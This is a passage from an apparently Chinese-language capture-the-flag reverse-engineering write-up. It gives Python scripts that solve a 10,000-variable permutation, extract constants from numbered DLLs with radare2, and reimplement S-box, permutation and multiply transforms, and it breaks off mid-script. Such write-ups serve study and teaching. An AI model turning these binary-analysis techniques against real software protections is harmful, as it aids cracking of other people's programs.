class="keyword">import</span> deque</span><br><span class="line">queue = deque()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(S[j]) == <span class="number">1</span>: queue.append(j)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> queue:</span><br><span class="line">    j = queue.popleft()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(S[j]) != <span class="number">1</span>: <span class="keyword">continue</span></span><br><span class="line">    id_val = <span class="built_in">next</span>(<span class="built_in">iter</span>(S[j]))</span><br><span class="line">    <span class="keyword">if</span> p[id_val] != -<span class="number">1</span>: <span class="keyword">continue</span></span><br><span class="line">    p[id_val] = remaining_T[j]</span><br><span class="line">    known += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Found p[<span class="subst">&#123;id_val:04d&#125;</span>] = <span class="subst">&#123;p[id_val]&#125;</span> from column <span class="subst">&#123;j&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> closure_by_id[id_val]:</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= k &lt; <span class="number">10000</span>:</span><br><span class="line">            <span class="keyword">if</span> id_val <span class="keyword">in</span> S[k]:</span><br><span class="line">                S[k].remove(id_val)</span><br><span class="line">                remaining_T[k] -= p[id_val]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(S[k]) == <span class="number">1</span>:</span><br><span class="line">                    queue.append(k)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[INFO] Solved <span class="subst">&#123;known&#125;</span>/10000 variables&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> known == <span class="number">10000</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sorted</span>(p) == <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">10000</span>)):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;order.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> row_index <span class="keyword">in</span> p:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        order = [<span class="number">0</span>] * <span class="number">10000</span></span><br><span class="line">        <span class="keyword">for</span> id_val <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">            row_idx = p[id_val]</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= row_idx &lt; <span class="number">10000</span>:</span><br><span class="line">                order[row_idx] = id_val</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Invalid row index <span class="subst">&#123;row_idx&#125;</span> for ID <span class="subst">&#123;id_val&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;order.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> id_val <span class="keyword">in</span> order:</span><br><span class="line">                f.write(<span class="string">f&quot;<span class="subst">&#123;id_val:04d&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[SUCCESS] Solved!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[INFO] Writing matrix.txt (10000x10000 binary matrix)...&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;matrix.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> id_val <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">                row = [<span class="string">&#x27;0&#x27;</span>] * <span class="number">10000</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> closure_by_id[id_val]:</span><br><span class="line">                    <span class="keyword">if</span> <span class="number">0</span> &lt;= j &lt; <span class="number">10000</span>:</span><br><span class="line">                        row[j] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">                f.write(<span class="string">&#x27;&#x27;</span>.join(row) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[SUCCESS] matrix.txt written.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[ERROR] Rresult is not a permutation&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[ERROR] Cannot solve.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">A = np.zeros((<span class="number">10000</span>, <span class="number">10000</span>), dtype=np.uint8)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;matrix.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(f):</span><br><span class="line">        A[i] = np.frombuffer(line.strip().encode(), dtype=<span class="string">&#x27;S1&#x27;</span>).astype(<span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;order.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    order = [<span class="built_in">int</span>(line.strip()) <span class="keyword">for</span> line <span class="keyword">in</span> f]</span><br><span class="line">M = A[order]</span><br><span class="line">T_recon = np.dot(np.arange(<span class="number">10000</span>, dtype=np.uint64), M)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;target.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    hex_str = <span class="string">&#x27;&#x27;</span>.join(f.read().split())</span><br><span class="line">data = <span class="built_in">bytes</span>.fromhex(hex_str)</span><br><span class="line">T_orig = np.frombuffer(data, dtype=<span class="string">&#x27;&lt;u4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> np.array_equal(T_recon, T_orig), <span class="string">&quot;Verification failed!&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Verification passed!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>得到顺序表和二值矩阵，接下来同构加密过程</p>
<h2 id="9-5-正向同构check运算过程"><a href="#9-5-正向同构check运算过程" class="headerlink" title="#9.5 正向同构check运算过程"></a>#9.5 正向同构check运算过程</h2><h3 id="9-5-1-前半部分"><a href="#9-5-1-前半部分" class="headerlink" title="#9.5.1 前半部分"></a>#9.5.1 前半部分</h3><p>分析check函数中形如<font color=lime><strong>_Z21fxxxxxxxxxxxxxxxxxPh</strong></font>函数的模式，发现一共有3种，分别对应<font color=lime><strong>类卷积乘法</strong></font>（const 31字节，间隔是var30和28，不可逆，记为<font color=violet><strong>C</strong></font>模式），<font color=lime><strong>打乱顺序</strong></font>（32字节，间隔是60和58，可逆，记为<font color=violet><strong>B</strong></font>模式）和<font color=lime><strong>sbox替换</strong></font>（256字节，可逆，记为<font color=violet><strong>A</strong></font>模式），编写脚本提取所有常量：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> r2pipe</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">os.makedirs(<span class="string">&quot;consts&quot;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">DB_FILE = <span class="string">&quot;exported_functions.db&quot;</span></span><br><span class="line">DLL_FOLDER = <span class="string">&quot;dlls&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_exported_functions_index</span>():</span><br><span class="line">    func_to_dll = &#123;&#125;</span><br><span class="line">    conn = sqlite3.connect(DB_FILE)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">&quot;SELECT id, exported_functions FROM dll_exports&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> cursor:</span><br><span class="line">        id_num, funcs_json = row</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            func_list = json.loads(funcs_json)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(func_list, <span class="built_in">list</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            dll_name = <span class="string">f&quot;<span class="subst">&#123;id_num:04d&#125;</span>.dll&quot;</span></span><br><span class="line">            <span class="keyword">for</span> func <span class="keyword">in</span> func_list:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(func, <span class="built_in">str</span>) <span class="keyword">and</span> func.startswith(<span class="string">&#x27;_Z21f&#x27;</span>) <span class="keyword">and</span> func.endswith(<span class="string">&#x27;Ph&#x27;</span>):</span><br><span class="line">                    <span class="keyword">if</span> func <span class="keyword">in</span> func_to_dll:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;[!] Warning: function <span class="subst">&#123;func&#125;</span> appears in multiple DLLs!&quot;</span>)</span><br><span class="line">                    func_to_dll[func] = (id_num, dll_name)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] Failed to parse functions for id=<span class="subst">&#123;id_num&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="keyword">return</span> func_to_dll</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">analyze_function_in_dll</span>(<span class="params">dll_path: <span class="built_in">str</span>, func_name: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  [+] Analyzing <span class="subst">&#123;func_name&#125;</span> in <span class="subst">&#123;dll_path&#125;</span>&quot;</span>)</span><br><span class="line">    r2 = r2pipe.<span class="built_in">open</span>(dll_path, flags=[<span class="string">&#x27;-e&#x27;</span>, <span class="string">&#x27;bin.relocs.apply=true&#x27;</span>])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exports = r2.cmdj(<span class="string">&quot;iEj&quot;</span>)</span><br><span class="line">        target = <span class="built_in">next</span>((e <span class="keyword">for</span> e <span class="keyword">in</span> exports <span class="keyword">if</span> e.get(<span class="string">&quot;name&quot;</span>) == func_name), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> target:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    [-] Not found in exports&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">        vaddr = target[<span class="string">&quot;vaddr&quot;</span>]</span><br><span class="line">        r2.cmd(<span class="string">f&quot;af @ <span class="subst">&#123;vaddr&#125;</span>&quot;</span>)</span><br><span class="line">        disasm_lines = r2.cmd(<span class="string">f&quot;pdr @ <span class="subst">&#123;vaddr&#125;</span>&quot;</span>).splitlines()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> disasm_lines <span class="keyword">or</span> <span class="built_in">any</span>(<span class="string">&quot;invalid&quot;</span> <span class="keyword">in</span> line.lower() <span class="keyword">for</span> line <span class="keyword">in</span> disasm_lines):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">        movabs_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;movabs\s+(rax|rdx),\s*(0x[0-9a-fA-F]+)&#x27;</span>)</span><br><span class="line">        constants = []</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> disasm_lines:</span><br><span class="line">            <span class="keyword">match</span> = movabs_pattern.search(line)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                constants.append(<span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>), <span class="number">16</span>))</span><br><span class="line">        const_count = <span class="built_in">len</span>(constants)</span><br><span class="line">        <span class="keyword">if</span> const_count == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;A&#x27;</span>, constants</span><br><span class="line">        <span class="keyword">elif</span> const_count == <span class="number">4</span>:</span><br><span class="line">            disasm_text = <span class="string">&quot;\n&quot;</span>.join(disasm_lines)</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;mov\s+qword\s+\[var_30h\]&#x27;</span>, disasm_text) <span class="keyword">and</span> \</span><br><span class="line">               re.search(<span class="string">r&#x27;mov\s+qword\s+\[var_28h\]&#x27;</span>, disasm_text):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;B&#x27;</span>, constants</span><br><span class="line">            <span class="keyword">elif</span> re.search(<span class="string">r&#x27;mov\s+qword\s+\[var_60h\]&#x27;</span>, disasm_text) <span class="keyword">and</span> \</span><br><span class="line">                 re.search(<span class="string">r&#x27;mov\s+qword\s+\[var_58h\]&#x27;</span>, disasm_text):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;C&#x27;</span>, constants</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    [!] 4 constants but unknown pattern in <span class="subst">&#123;func_name&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;ERROR&#x27;</span>, constants</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    [!] Unexpected constant count: <span class="subst">&#123;const_count&#125;</span> in <span class="subst">&#123;func_name&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;ERROR&#x27;</span>, constants</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        r2.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python extract_by_calls.py &lt;id&gt;    eg.0000&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    input_id = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> input_id.isdigit() <span class="keyword">or</span> <span class="built_in">len</span>(input_id) &gt; <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ID must be a numeric string (eg. 0000, 123)&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    id_num = <span class="built_in">int</span>(input_id)</span><br><span class="line">    id_str = <span class="string">f&quot;<span class="subst">&#123;id_num:04d&#125;</span>&quot;</span></span><br><span class="line">    dll_path = os.path.join(DLL_FOLDER, <span class="string">f&quot;<span class="subst">&#123;id_str&#125;</span>.dll&quot;</span>)</span><br><span class="line">    calls_txt = os.path.join(<span class="string">&quot;calls&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;id_str&#125;</span>_calls.txt&quot;</span>)</span><br><span class="line">    output_path = os.path.join(<span class="string">&quot;consts&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;id_str&#125;</span>.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(dll_path):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] DLL not found: <span class="subst">&#123;dll_path&#125;</span>&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Running export_calls.py <span class="subst">&#123;dll_path&#125;</span>&quot;</span>)</span><br><span class="line">    result = subprocess.run([sys.executable, <span class="string">&quot;export_calls.py&quot;</span>, dll_path])</span><br><span class="line">    <span class="keyword">if</span> result.returncode != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] export_calls.py failed!&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(calls_txt):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] <span class="subst">&#123;calls_txt&#125;</span> not generated by export_calls.py&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(calls_txt, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read().strip()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target_funcs = ast.literal_eval(content)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(target_funcs, <span class="built_in">list</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Not a list&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Failed to parse <span class="subst">&#123;calls_txt&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Loaded <span class="subst">&#123;<span class="built_in">len</span>(target_funcs)&#125;</span> target functions from <span class="subst">&#123;calls_txt&#125;</span>&quot;</span>)</span><br><span class="line">    func_to_dll = load_exported_functions_index()</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> target_funcs:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="built_in">isinstance</span>(func, <span class="built_in">str</span>) <span class="keyword">and</span> func.startswith(<span class="string">&#x27;_Z21f&#x27;</span>) <span class="keyword">and</span> func.endswith(<span class="string">&#x27;Ph&#x27;</span>)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> func <span class="keyword">not</span> <span class="keyword">in</span> func_to_dll:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    [!] Function <span class="subst">&#123;func&#125;</span> not found in database&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        id_num, dll_name = func_to_dll[func]</span><br><span class="line">        actual_dll_path = os.path.join(DLL_FOLDER, dll_name)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(actual_dll_path):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    [!] DLL <span class="subst">&#123;actual_dll_path&#125;</span> not found for function <span class="subst">&#123;func&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        typ, consts = analyze_function_in_dll(actual_dll_path, func)</span><br><span class="line">        <span class="keyword">if</span> typ <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> typ == <span class="string">&#x27;ERROR&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    [!] Skipping <span class="subst">&#123;func&#125;</span> due to analysis error&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        const_str = <span class="string">&quot;[&quot;</span> + <span class="string">&quot;, &quot;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;c:016x&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> consts) + <span class="string">&quot;]&quot;</span></span><br><span class="line">        results.append(<span class="string">f&quot;<span class="subst">&#123;func&#125;</span>\t<span class="subst">&#123;typ&#125;</span>\t<span class="subst">&#123;const_str&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> out_f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> results:</span><br><span class="line">            out_f.write(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Results saved to <span class="subst">&#123;output_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>同构前面的<font color=lime><strong>_Z21fPh</strong></font>函数，需要注意的是，A&#x2F;B&#x2F;C模式函数中在开头均有一行<code>*a1 ^= *(_DWORD *)off_268936B6020[id];</code>，说明输入的前四个字节会被异或<font color=red><strong>Output Buffer</strong></font>中对应DLL id索引的dword（需要注意：如果函数来源于别的dll，xor的是别的dll的索引），此处同构可以先按0处理：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_mul</span>(<span class="params">a, b</span>):</span><br><span class="line">    res = <span class="built_in">bytearray</span>(<span class="number">32</span>)</span><br><span class="line">    carry = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        total = carry</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>):</span><br><span class="line">            total += a[j] * b[i - j]</span><br><span class="line">        res[i] = total &amp; <span class="number">0xFF</span></span><br><span class="line">        carry = total &gt;&gt; <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">n2ble</span>(<span class="params">na, n</span>):</span><br><span class="line">    b = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> na: b.extend(a.to_bytes(n, byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_const</span>(<span class="params">buf, offsets, na, n</span>):</span><br><span class="line">    <span class="keyword">for</span> a, offset <span class="keyword">in</span> <span class="built_in">zip</span>(na, offsets):</span><br><span class="line">        buf[offset:offset + n] = a.to_bytes(n, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_A</span>(<span class="params">inp, qkey</span>):</span><br><span class="line">    sbox = n2ble(qkey, <span class="number">8</span>)</span><br><span class="line">    inp = <span class="built_in">bytearray</span>([sbox[byte] <span class="keyword">for</span> byte <span class="keyword">in</span> inp])</span><br><span class="line">    <span class="keyword">return</span> inp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_B</span>(<span class="params">inp, qkey</span>):</span><br><span class="line">    perm = n2ble(qkey, <span class="number">8</span>)</span><br><span class="line">    result = <span class="built_in">bytearray</span>(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>): result[i] = inp[perm[i]]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_C</span>(<span class="params">inp, qkey</span>):</span><br><span class="line">    key = load_const(<span class="built_in">bytearray</span>(<span class="number">32</span>), [<span class="number">0</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">23</span>], qkey, <span class="number">8</span>)</span><br><span class="line">    tag = inp[<span class="number">0</span>] &amp; <span class="number">1</span></span><br><span class="line">    inp[<span class="number">0</span>] |= <span class="number">1</span></span><br><span class="line">    v3 = <span class="built_in">bytearray</span>(<span class="number">32</span>)</span><br><span class="line">    v3[<span 